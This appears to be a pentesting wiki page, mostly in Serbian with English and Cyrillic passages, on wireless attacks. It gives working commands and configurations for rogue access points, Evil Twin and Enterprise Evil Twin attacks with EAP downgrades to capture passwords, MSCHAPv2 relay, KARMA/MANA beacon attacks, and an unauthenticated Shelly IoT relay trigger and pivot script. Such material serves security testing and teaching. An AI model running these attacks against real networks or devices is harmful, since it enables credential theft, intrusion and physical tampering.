### Izbor mreže i roaming

- Protokol 802.11 definiše kako stanica pristupa Extended Service Set-u (ESS), ali ne određuje kriterijume za izbor ESS-a ili pristupne tačke (AP) unutar njega.
- Stanice mogu da se premeštaju (roam) između AP-ova koji dele isti ESSID, održavajući povezanost kroz zgradu ili područje.
- Protokol zahteva autentifikaciju stanice prema ESS-u, ali ne zahteva da se AP autentifikuje prema stanici.

### Liste preferiranih mreža (PNL)

- Stanice čuvaju ESSID svake bežične mreže sa kojom se povezuju u svojoj Listi preferiranih mreža (PNL), zajedno sa konfiguracionim detaljima specifičnim za mrežu.
- PNL se koristi za automatsko povezivanje na poznate mreže, poboljšavajući korisničko iskustvo pojednostavljenjem procesa povezivanja.

### Pasivno skeniranje

- AP-ovi periodično emituju beacon frames, najavljujući svoje prisustvo i karakteristike, uključujući ESSID AP-a osim ako emitovanje nije onemogućeno.
- Tokom pasivnog skeniranja, stanice slušaju za beacon frames. Ako ESSID iz beacona odgovara unosu u PNL stanice, stanica se može automatski povezati na taj AP.
- Poznavanje PNL uređaja omogućava potencijalnu eksploataciju oponašanjem ESSID-a poznate mreže, navodeći uređaj da se poveže na zlonamerni AP.

### Aktivno sondiranje

- Aktivno sondiranje podrazumeva da stanice šalju probe requests kako bi otkrile obližnje AP-ove i njihove karakteristike.
- Usmereni probe zahtevi ciljaju konkretan ESSID, pomažući da se detektuje da li je određena mreža u dometu, čak i ako je sakrivena.
- Broadcast probe requests imaju polje SSID postavljeno na null i šalju se svim obližnjim AP-ovima, omogućavajući stanici da proveri bilo koju preferiranu mrežu bez otkrivanja sadržaja PNL-a.

## Jednostavan AP sa preusmeravanjem na Internet

Pre nego što objasnimo kako izvesti složenije napade, biće objašnjeno **kako** jednostavno **kreirati** **AP** i **preusmeriti** njegov **saobraćaj** na interfejs povezan **na** **Internet**.

Koristeći `ifconfig -a` proverite da li su wlan interfejs za kreiranje AP-a i interfejs povezan na Internet prisutni.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Kreirajte konfiguracioni fajl `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Zatim **set IPs** i **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
A zatim **pokrenite** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Kreirajte konfiguracioni fajl `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Zaustavite smetajuće procese** , podesite **monitor mode**, i **pokrenite hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Prosleđivanje i preusmeravanje
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Napad evil twin iskorišćava način na koji WiFi klijenti prepoznaju mreže, oslanjajući se pre svega na naziv mreže (ESSID) bez zahtevanja da se base station (access point) autentifikuje klijentu. Ključne tačke uključuju:

- **Difficulty in Differentiation**: Uređaji teško razlikuju legitimne i rogue access points kada dele isti ESSID i encryption type. U praksi mreže često koriste više access points sa istim ESSID-om da bi neprimetno proširile pokrivenost.
- **Client Roaming and Connection Manipulation**: 802.11 protokol omogućava uređajima da roam-uju između access points unutar istog ESS. Napadači to mogu iskoristiti tako što će naterati uređaj da se disconnect-uje od trenutnog base station-a i poveže na rogue. Ovo se može postići nudeći jači signal ili ometanjem veze ka legitimnom access point-u putem metoda kao što su deauthentication packets ili jamming.
- **Challenges in Execution**: Uspešna realizacija evil twin napada u okruženjima sa više, dobro postavljenih access points može biti izazovna. Deauthenticating jednog legitimnog access point-a često rezultira time da se uređaj poveže na drugi legitimni access point, osim ako napadač ne može deauthenticate sve obližne access points ili strateški postaviti rogue access point.

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Takođe možete kreirati Evil Twin pomoću **eaphammer** (imajte na umu da, da biste kreirali evil twins sa eaphammer, interfejs **ne bi trebao biti** u **monitor** modu):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ili koristeći Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Obratite pažnju da, po defaultu, ako je neki ESSID u PNL sačuvan kao WPA zaštićen, uređaj se neće automatski povezati na Open Evil Twin. Možete pokušati DoS-ovati stvarni AP i nadati se da će se korisnik ručno povezati na vaš Open Evil Twin, ili možete DoS-ovati stvarni AP i koristiti WPA Evil Twin da uhvatite handshake (koristeći ovu metodu nećete moći dozvoliti žrtvi da se poveže na vas jer ne znate PSK, ali možete snimiti handshake i pokušati ga razbiti).

_Neki OS i AV će upozoriti korisnika da je povezivanje na Open mrežu opasno..._

### WPA/WPA2 Evil Twin

Možete napraviti **Evil Twin koristeći WPA/2** i ako su uređaji konfigurisani da se povezuju na taj SSID koristeći WPA/2, pokušaće da se povežu. Ipak, **da biste završili 4-way-handshake** takođe morate **znati** **lozinku** koju će klijent koristiti. Ako je **ne znate**, **povezivanje neće biti završeno**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Da biste razumeli ove napade, preporučujem da pre toga pročitate kratak [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Using hostapd-wpe**

`hostapd-wpe` zahteva **konfiguracioni fajl** da bi radio. Da biste **automatizovali** generisanje ovih konfiguracija, možete koristiti [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (preuzmite python fajl u _/etc/hostapd-wpe_/)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
U konfiguracionom fajlu možete odabrati mnogo različitih stvari kao što su ssid, channel, user files, cret/key, dh parameters, wpa version i auth...

[**Korišćenje hostapd-wpe sa EAP-TLS da dozvoli bilo koji certificate da se prijavi.**](evil-twin-eap-tls.md)

**Korišćenje EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Po defaultu, EAPHammer predlaže sledeće metode autentifikacije (obratite pažnju na GTC kao prvi koji pokušava da dobije plaintext lozinke, a zatim koristi robusnije auth methods):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Ovo je podrazumevana metodologija za izbegavanje dugih vremena konekcije. Međutim, možete i navesti serveru metode autentifikacije od najslabijih do najjačih:
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### When clients skip RADIUS certificate validation (PEAP/TTLS)

- If devices are configured with "do not validate certificate", a cloned AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) will collect **NetNTLMv2** (PEAP-MSCHAPv2) or **cleartext** creds (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) both reveals hidden SSIDs during probes and forces reconnects, unless PMF/802.11w blocks spoofed deauth.
- Cracked NetNTLMv2 gives reusable Wi‑Fi/AD creds; GTC yields immediate plaintext.

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- For machine accounts with uncrackable random passwords, abuse **MSCHAPv2 relay**: run `hostapd-mana` as the Evil Twin, forwarding the MSCHAPv2 exchange to `wpa_sycophant`, which simultaneously connects to the legitimate AP. Successful relay grants authenticated Wi‑Fi without recovering the password.
- Use builds that support the target security level (WPA3/PMF requires recent hostapd/wpa_supplicant); PMF prevents deauth coercion, so wait for voluntary client associations.

**Using Airgeddon**

`Airgeddon` can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to **capture the user and the MD5 of the password**. Later, the attacker can try to crack the password.\
`Airggedon` offers you the possibility of a **continuous Evil Twin attack (noisy)** or **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Inside the **configuration** of _hostapd-wpe_ **comment** the line that contains _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
This will make `hostapd-wpe` to **exchange keys using RSA** instead of DH, so you will be able to **decrypt** the traffic later **knowing the servers private key**.

Now start the **Evil Twin** using **`hostapd-wpe`** with that modified configuration as usual. Also, start **`wireshark`** in the **interface** which is performing the Evil Twin attack.

Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Add a new entry and fill the form with this values: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- The rogue AP will respond only to probe requests from devices specified in the whitelist, remaining invisible to all others not listed.
2. **MAC-based Blacklist**:
- The rogue AP will ignore probe requests from devices on the blacklist, effectively making the rogue AP invisible to those specific devices.
3. **SSID-based Whitelist**:
- The rogue AP will respond to probe requests only for specific ESSIDs listed, making it invisible to devices whose Preferred Network Lists (PNLs) do not contain those ESSIDs.
4. **SSID-based Blacklist**:
- The rogue AP will not respond to probe requests for the specific ESSIDs on the blacklist, making it invisible to devices seeking those particular networks.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Ova metoda omogućava napadaču da kreira malicious access point (AP) koji odgovara na sve probe requests od uređaja koji pokušavaju da se povežu na mreže. Ova tehnika prevari uređaje da se povežu na napadačev AP imitirajući mreže koje uređaji traže. Kada uređaj pošalje zahtev za povezivanje tom rogue AP-u, veza se uspostavi, pa se uređaj greškom povezuje na napadačevu mrežu.

### MANA

Potom su uređaji počeli da ignorišu nesigurne odgovore mreža, smanjujući efikasnost originalnog karma attack. Međutim, nova metoda, poznata kao MANA attack, koju su predstavili Ian de Villiers i Dominic White, uključuje rogue AP koji hvata Preferred Network Lists (PNL) sa uređaja odgovarajući na njihove broadcast probe requests sa imenima mreža (SSIDs) prethodno sačuvanim na uređajima. Ovaj sofisticirani napad zaobilazi zaštite protiv originalnog karma attack iskorišćavanjem načina na koji uređaji pamte i prioritetizuju poznate mreže.

MANA attack funkcioniše praćenjem i directed i broadcast probe requests od uređaja. Za directed requests beleži MAC address uređaja i traženo ime mreže, dodajući te informacije na listu. Kada stigne broadcast request, AP odgovara informacijama koje se poklapaju sa bilo kojom mrežom sa te liste uređaja, mameći uređaj da se poveže na rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** je napredna strategija za situacije kada uređaji ne koriste directed probing ili kada su njihove Preferred Network Lists (PNL) nepoznate napadaču. Funkcioniše na principu da **uređaji u istoj oblasti verovatno dele neke nazive mreža u svojim PNL-ovima**. Umesto selektivnog odgovaranja, ovaj attack emituje probe responses za svaki naziv mreže (ESSID) pronađen u kombinovanim PNL-ovima svih posmatranih uređaja. Ovakav širok pristup povećava verovatnoću da uređaj prepozna poznatu mrežu i pokuša da se poveže na rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

When the **Loud MANA attack** may not suffice, the **Known Beacon attack** presents another approach. This method **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** derived from a wordlist. This simulates the presence of numerous networks, hoping to match an ESSID within the victim's PNL, prompting a connection attempt to the fabricated AP. The attack can be amplified by combining it with the `--loud` option for a more aggressive attempt to ensnare devices.

Eaphammer implemented this attack as a MANA attack where all the ESSIDs inside a list are charged (you could also combine this with `--loud` to create a Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

**Known Beacon Burst attack** podrazumeva **brzo emitovanje beacon frames za svaki ESSID naveden u fajlu**. To stvara gusto okruženje lažnih mreža, značajno povećavajući verovatnoću da će se uređaji povezati na rogue AP, naročito kada je u kombinaciji sa MANA attack. Ova tehnika koristi brzinu i obim da preplavi mehanizme odabira mreže uređaja.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** је протокол који омогућава уређајима да се повежу директно једни са другима користећи Wi-Fi без потребе за традиционалном bežičnom pristupnom tačkom. Ова могућност је интегрисана у разне Internet of Things (IoT) уређаје, као што су штампачи и телевизори, и олакшава директну комуникацију уређај-уређај. Значајна карактеристика Wi-Fi Direct је да један уређај преузима улогу access point-а, познат као group owner, да би управљао везом.

Безбедност Wi-Fi Direct веза се успоставља преко **Wi-Fi Protected Setup (WPS)**, који подржава неколико метода за сигурно упаривање, укључујући:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Ове методе, нарочито PIN entry, подложне су истим рањивостима као WPS у традиционалним Wi-Fi мрежама, те представљају циљ сличних векторa напада.

### EvilDirect Hijacking

**EvilDirect Hijacking** је напад специфичан за Wi-Fi Direct. Он огледа концепт Evil Twin напада али циља Wi-Fi Direct везе. У овом сценарију, нападач се представља као легитимни group owner са циљем да превари уређаје да се повежу на злонамерни ентитет. Oва метода се може извршити користећи алате као што је `airbase-ng` тако што се наведу канал, ESSID и MAC адреса уређаја који се имитира:

## Commissioning AP persistence & dual-homed IoT pivoting (Shelly Gen4 case)

Неки потрошачки IoT релеи/контролери остављају commissioning **open AP** активним и након придруживања IoT WLAN-у (нпр. Shelly Gen4 SSID-ови који почињу са `Shelly`). Уређај остаје **dual-homed**: AP интерфејс са подразумеваном IP `192.168.33.1` плус клијентски интерфејс на унутрашњем WLAN-у.

**Ток злоупотребе (захтева Wi‑Fi близину):**

1. Придружите се provisioning AP-у, добијте DHCP lease и прегледајте **AP-side HTTP API**.
2. Покрените релеје преко неаутентификованих endpoints, нпр. `http://192.168.33.1/relay/0?turn=on` (утицај на врата/капiju/гаражу). Endpoint-и за upload firmware-а могу додати перзистенцију.
3. Користите га као **pivot**: Shelly scripting може слати HTTP са унутрашњег интерфејса ка другим LAN хостовима. Пример pivot-а на други Shelly на `10.0.98.221`:
```javascript
Shelly.addEventHandler(function (event) {
if (event.component === "switch:0" && event.info.state) {
Shelly.call("HTTP.GET", { url: "http://10.0.98.221/light/0?turn=on" });
}
});
```
Замените URL било којом доступном интерном HTTP метом; dual-homing избегава додатни routing/NAT посао.
4. У великом обиму: упитивањем vendor SSID-ова на **wigle.net** (нпр. `Shelly`) лоцирајте commissioning AP-ове за експлоатацију на лицу места.

За перзистенцију, оставите commissioning AP омогућен.

## References

- [https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/](https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/)
- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Pogledati [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login sa Facebook-om i imitacija WPA u captive portalima)

{{#include ../../banners/hacktricks-training.md}}
